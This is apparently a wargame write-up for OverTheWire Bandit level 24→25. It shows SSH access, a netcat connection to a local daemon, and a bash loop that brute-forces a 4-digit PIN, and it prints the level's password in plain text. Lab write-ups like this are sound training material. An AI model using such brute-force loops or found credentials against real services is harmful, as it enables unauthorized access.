# Bandit Level 24 → Level 25

## Goal
The password for the next level is obtained by brute-forcing a 4-digit PIN against a daemon on port 30002 using the current password.

## Solution

1. Connected to the server using SSH: 
```
ssh -p 2220 bandit24@bandit.labs.overthewire.org
```
2. Connected to the service using netcat:
```
nc localhost 30002
```
3. Observed that the service requires:
```
password for bandit24
a 4-digit PIN
```
4. Generated all possible 4-digit PIN combinations and sent them in a loop to brute-force the service:
```
for pin in $(seq -w 0000 9999)
do
    pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
    echo $pass $pin
done | nc localhost 30002
```

## Result
The password for bandit25 was obtained after successfully brute-forcing the correct PIN.

## Learning
- I learned that brute-force is a last-resort option for accessing a service, but it becomes practical when the keyspace is small.

- I learned that automation is powerful and efficient, allowing repetitive tasks to be executed quickly using loops instead of manual execution or repeated single commands.
